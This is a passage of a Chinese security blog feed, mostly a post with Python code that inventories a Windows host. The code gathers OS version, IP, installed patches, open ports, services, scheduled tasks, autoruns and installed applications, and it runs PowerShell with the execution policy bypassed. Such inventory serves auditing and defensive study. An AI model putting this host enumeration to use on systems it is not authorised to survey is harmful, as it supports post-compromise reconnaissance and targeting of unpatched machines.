class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100+2] = %s&quot;</span> % <span class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 = 1122627862697321019530282965736391850755580895936802291161309915792429961624747356094273651528053737694375752383507509008511083571424513544351844231796981247</span></span><br><span class="line"><span class="comment"># n2 = 42452228756074949430200119187674072800166259263276225653674599426683428744745000585507174701894408343398957593869403921976682474759688236534918012868451437</span></span><br><span class="line"><span class="comment"># r = 12562551311997602982227662257453842057851021749009292708783465660065261139703971906109320639580310598023202634257624805719964182261882169860035285540999137</span></span><br><span class="line"><span class="comment"># arr[10**100] = 4838353389408955215917845462224851356983185785715321739245030612236910363177888113470205298612968999913978808363082599570155255107799227941046736259627961</span></span><br><span class="line"><span class="comment"># arr[10**100+1] = 10699223576890057648654189340104320126576219437282628103579325446469238279292850193524138389756436672641376651989022132710127197616146958216805814995598472</span></span><br><span class="line"><span class="comment"># arr[10**100+2] = 10255743354332378416989087696439685123717830836779737961024112448965245238772080092701344614830923313888435306261206177140560579750917219609679498132161402</span></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>WP</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/m0_51507437/article/details/124205732">https://blog.csdn.net/m0_51507437/article/details/124205732</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows主机资产信息收集脚本</title>
    <url>/posts/d50c9f22/</url>
    <content><![CDATA[<h3 id="收集内容-amp-amp-实现思路"><a href="#收集内容-amp-amp-实现思路" class="headerlink" title="收集内容&amp;&amp;实现思路"></a>收集内容&amp;&amp;实现思路</h3><p>系统信息[OS、IP 、补丁信息]、开放端口、服务、计划任务、自启动项、安装应用</p>
<h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4><p>通过调用Powershell获取主机环境信息【不能用wmic 因为wmic可能需要高权限】</p>
<h4 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h4><p>netstat -ano 过滤出 Listening 或 Established的信息</p>
<p>暂时还不知道怎么去优化 后续看情况调整</p>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>通过wmi获取主机中所有服务[running/stop]</p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree 下存在着各种计划任务</p>
<p>但是好像没法用python去读【或许是虚表 没法读】</p>
<p>所以考虑使用COM接口去请求 Schedule.Service ，但是这种方法只能获取部分计划任务，不完整</p>
<h4 id="自启动项"><a href="#自启动项" class="headerlink" title="自启动项"></a>自启动项</h4><p># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
<p># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
<h4 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h4><p># 列出 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</p>
<p># 列出 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</p>
<h3 id="环境安装问题"><a href="#环境安装问题" class="headerlink" title="环境安装问题"></a>环境安装问题</h3><p>可通过python3 调用命令行或查注册表键值对获取相关信息</p>
<p>在win2003中没有Powershell环境 要用py3或者bat脚本去获取信息【但是win2003支持python版本最高位python3.4 环境安装有问题】</p>
<p>需要提前安装相关库</p>
<p>pip install wmi</p>
<p>pip install pypiwin32</p>
<p>win10 win7 win2008 win2012 win2016测试下脚本均可行</p>
<p>win2012下 安装python3.7.0 后【选择添加环境变量 安装后自带pip】 可直接使用打包好的exe</p>
<p>运行脚本 缺少 vcruntime  但是在安装runtime时报错需要下载前置补丁 【解决参考<a href="https://blog.csdn.net/blog_user_zk/article/details/111040113%E3%80%91">https://blog.csdn.net/blog_user_zk/article/details/111040113】</a></p>
<p>依次安装 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42365">KB2939087</a> <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43531">KB2975061</a> <a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=42334">KB2919355</a> 再安装VCRuntime即可</p>
<p>win2008 python可用3.7.0缺少 VCRUNTIME140_1.dll … 需要安装runtime  <a href="https://aka.ms/vs/17/release/vc_redist.x64.exe">https://aka.ms/vs/17/release/vc_redist.x64.exe</a></p>
<p>win2003 python3.3.5【<a href="http://www.python.org/ftp/python/3.3.5/python-3.3.5.msi%E3%80%91">http://www.python.org/ftp/python/3.3.5/python-3.3.5.msi】</a> 语法不支持 f相关 所以需要全改成format</p>
<p>win2003 pip安装有问题 还没解决。。。。。。。。。。。。。</p>
<p>换版本 <a href="https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi">https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi</a> 换成python3.4.4 自带pip</p>
<p>但是更新pip 后将不可用…. </p>
<p>pip install pypiwin32,wmi 都不行 版本过低 所以不可用。 【pypiwin32只支持python3.5+】</p>
<h3 id="Version1"><a href="#Version1" class="headerlink" title="Version1"></a>Version1</h3><h4 id="Python3代码"><a href="#Python3代码" class="headerlink" title="Python3代码"></a>Python3代码</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> win32com.client</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># 到达注册表末尾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印自启动项</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;title&#125;</span>:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="comment"># print(f&quot;Path: &#123;value&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;&#123;title&#125; is empty.\n&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_task_scheduler</span>():</span><br><span class="line">    scheduler = win32com.client.Dispatch(<span class="string">&#x27;Schedule.Service&#x27;</span>)</span><br><span class="line">    scheduler.Connect()</span><br><span class="line">    rootFolder = scheduler.GetFolder(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rootFolder</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_tasks_info</span>(<span class="params">root_folder</span>):</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> root_folder.GetTasks(<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Task Name: <span class="subst">&#123;task.Name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Next Run Time: <span class="subst">&#123;task.NextRunTime&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;State: <span class="subst">&#123;task.State&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_services</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = wmi.WMI()</span><br><span class="line">        services = c.Win32_Service()</span><br><span class="line">        <span class="keyword">return</span> services</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(f&quot;Error: &#123;e&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取系统信息、补丁信息......\n&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取操作系统版本信息</span></span><br><span class="line">    os_version = platform.platform()</span><br><span class="line">    <span class="comment"># 打印操作系统版本信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;操作系统版本:&quot;</span>, os_version)</span><br><span class="line">    <span class="comment"># 设置 PowerShell 脚本</span></span><br><span class="line">    powershell_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # # 设置执行策略</span></span><br><span class="line"><span class="string">    # Set-ExecutionPolicy RemoteSigned -Force</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # # 获取已安装的所有补丁信息</span></span><br><span class="line"><span class="string">    # $patches = Get-HotFix</span></span><br><span class="line"><span class="string">    # $patchCount = $patches.Count</span></span><br><span class="line"><span class="string">    # Write-Output &quot;已安装的补丁数量: $patchCount&quot;</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # foreach ($patch in $patches) &#123;</span></span><br><span class="line"><span class="string">    #     # Write-Output &quot;补丁号: $($patch.HotFixID) - 描述: $($patch.Description)&quot;</span></span><br><span class="line"><span class="string">    #     Write-Output &quot;补丁号: $($patch.HotFixID) &quot;</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # &#125;</span></span><br><span class="line"><span class="string">    # 设置输出编码为 UTF-8</span></span><br><span class="line"><span class="string">    $OutputEncoding = [System.Text.Encoding]::UTF8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 设置执行策略</span></span><br><span class="line"><span class="string">    Set-ExecutionPolicy RemoteSigned -Force</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取主机名</span></span><br><span class="line"><span class="string">    $hostname = $env:COMPUTERNAME</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 打印主机名</span></span><br><span class="line"><span class="string">    Write-Host &quot;主机名: $hostname&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取 IP 地址信息</span></span><br><span class="line"><span class="string">    $ipInfo = Get-NetIPAddress | Where-Object &#123; $_.AddressFamily -eq &quot;IPv4&quot; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 提取 IP 地址</span></span><br><span class="line"><span class="string">    $ipAddress = $ipInfo.IPAddress</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 打印 IP 地址</span></span><br><span class="line"><span class="string">    Write-Host &quot;IP 地址: $ipAddress&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取操作系统版本信息</span></span><br><span class="line"><span class="string">    $osVersion = [System.Environment]::OSVersion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取操作系统名称</span></span><br><span class="line"><span class="string">    $osName = (Get-CimInstance Win32_OperatingSystem).Caption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 打印操作系统名称</span></span><br><span class="line"><span class="string">    Write-Host &quot;操作系统名称: $osName&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 打印操作系统版本信息</span></span><br><span class="line"><span class="string">    Write-Host &quot;操作系统版本: $($osVersion.VersionString)&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取 Windows 版本号</span></span><br><span class="line"><span class="string">    $windowsVersion = &quot;$($osVersion.Version.Major).$($osVersion.Version.Minor)&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 打印 Windows 版本号</span></span><br><span class="line"><span class="string">    Write-Host &quot;Windows 版本号: $windowsVersion&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 获取已安装的所有补丁信息</span></span><br><span class="line"><span class="string">    $patches = Get-HotFix</span></span><br><span class="line"><span class="string">    $patchCount = $patches.Count</span></span><br><span class="line"><span class="string">    Write-Output &quot;已安装的补丁数量: $patchCount&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    foreach ($patch in $patches) &#123;</span></span><br><span class="line"><span class="string">         Write-Output &quot;补丁号: $($patch.HotFixID) - 描述: $($patch.Description)&quot;</span></span><br><span class="line"><span class="string">        # Write-Output &quot;补丁号: $($patch.HotFixID) &quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行 PowerShell 脚本</span></span><br><span class="line">    <span class="comment"># process = subprocess.Popen([&quot;powershell&quot;, &quot;-Command&quot;, powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)</span></span><br><span class="line">    process = subprocess.Popen([<span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;-ExecutionPolicy&quot;</span>, <span class="string">&quot;Bypass&quot;</span>, <span class="string">&quot;-Command&quot;</span>, powershell_script],</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    output, error = process.communicate()</span><br><span class="line">    <span class="comment"># 打印输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">    <span class="comment"># 如果有错误，打印错误信息</span></span><br><span class="line">    <span class="comment"># if error:</span></span><br><span class="line">    <span class="comment">#     print(&quot;错误信息:&quot;, error)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机已安装应用信息......\n&quot;</span>)</span><br><span class="line">    <span class="comment">#列出 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[=] HKLM:&quot;</span>)</span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">fr&quot;<span class="subst">&#123;subkey&#125;</span>\&#123;subkey_name&#125;&quot;</span></span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(display_name)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: &#123;display_name&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: Display Name not found.&quot;)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[=] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">fr&quot;<span class="subst">&#123;subkey&#125;</span>\&#123;subkey_name&#125;&quot;</span></span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(display_name)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: &#123;display_name&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: Display Name not found.&quot;)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机启动项信息......\n&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机计划任务信息......[注:使用COM接口仅可获取部分]\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        root_folder = get_task_scheduler()</span><br><span class="line">        print_tasks_info(root_folder)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机服务信息......\n&quot;</span>)</span><br><span class="line">    services = get_services()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印服务信息</span></span><br><span class="line">    <span class="keyword">for</span> service <span class="keyword">in</span> services:</span><br><span class="line">        <span class="comment"># 所有服务</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Service Name: <span class="subst">&#123;service.Name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Display Name: <span class="subst">&#123;service.DisplayName&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Status: <span class="subst">&#123;service.State&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRunningServiceInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机正在运行的服务信息......\n&quot;</span>)</span><br><span class="line">    services = get_services()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印服务信息</span></span><br><span class="line">    <span class="keyword">for</span> service <span class="keyword">in</span> services:</span><br><span class="line">        <span class="comment"># 只输出运行服务</span></span><br><span class="line">        <span class="keyword">if</span> service.State == <span class="string">&quot;Running&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">f&quot;Service Name: <span class="subst">&#123;service.Name&#125;</span>&quot;</span>)</span><br><span class="line">           <span class="comment"># print(f&quot;Display Name: &#123;service.DisplayName&#125;&quot;)</span></span><br><span class="line">           <span class="comment"># print(f&quot;Status: &#123;service.State&#125;&quot;)</span></span><br><span class="line">           <span class="comment"># print(&quot;==================================&quot;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机开放端口服务信息......\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.run([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">        netstat_output = result.stdout</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 筛选出 LISTENING 或 ESTABLISHED 的行并输出</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;LISTENING&quot;</span> <span class="keyword">in</span> line <span class="keyword">or</span> <span class="string">&quot;ESTABLISHED&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetAllInfo</span>():</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getScheduleTaskInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    <span class="comment"># getServiceInfo()</span></span><br><span class="line">    getRunningServiceInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   GetAllInfo()</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\test\PycharmProjects\EncodeShellCode\venv\Scripts\python.exe C:\Users\test\PycharmProjects\EncodeShellCode\GetPCInfo\GetAllInfo.py </span><br><span class="line">[+] 获取系统信息、补丁信息......</span><br><span class="line"></span><br><span class="line">操作系统版本: Windows-10-10.0.19045-SP0</span><br><span class="line">主机名: DESKTOP-F3958O4</span><br><span class="line">IP 地址: 192.168.181.141 127.0.0.1</span><br><span class="line">操作系统名称: Microsoft Windows 10 专业版</span><br><span class="line">操作系统版本: Microsoft Windows NT 10.0.19045.0</span><br><span class="line">Windows 版本号: 10.0</span><br><span class="line">已安装的补丁数量: 23</span><br><span class="line">补丁号: KB5034466 - 描述: Update</span><br><span class="line">补丁号: KB5030841 - 描述: Update</span><br><span class="line">补丁号: KB5003791 - 描述: Update</span><br><span class="line">补丁号: KB5011048 - 描述: Update</span><br><span class="line">补丁号: KB5011050 - 描述: Update</span><br><span class="line">补丁号: KB5012170 - 描述: Security Update</span><br><span class="line">补丁号: KB5015684 - 描述: Update</span><br><span class="line">补丁号: KB5034763 - 描述: Security Update</span><br><span class="line">补丁号: KB5016705 - 描述: Update</span><br><span class="line">补丁号: KB5020372 - 描述: Update</span><br><span class="line">补丁号: KB5022924 - 描述: Update</span><br><span class="line">补丁号: KB5023794 - 描述: Update</span><br><span class="line">补丁号: KB5025315 - 描述: Update</span><br><span class="line">补丁号: KB5026879 - 描述: Update</span><br><span class="line">补丁号: KB5028318 - 描述: Update</span><br><span class="line">补丁号: KB5028380 - 描述: Update</span><br><span class="line">补丁号: KB5029709 - 描述: Update</span><br><span class="line">补丁号: KB5031539 - 描述: Update</span><br><span class="line">补丁号: KB5032392 - 描述: Update</span><br><span class="line">补丁号: KB5032907 - 描述: Update</span><br><span class="line">补丁号: KB5034224 - 描述: Update</span><br><span class="line">补丁号: KB5005699 - 描述: Security 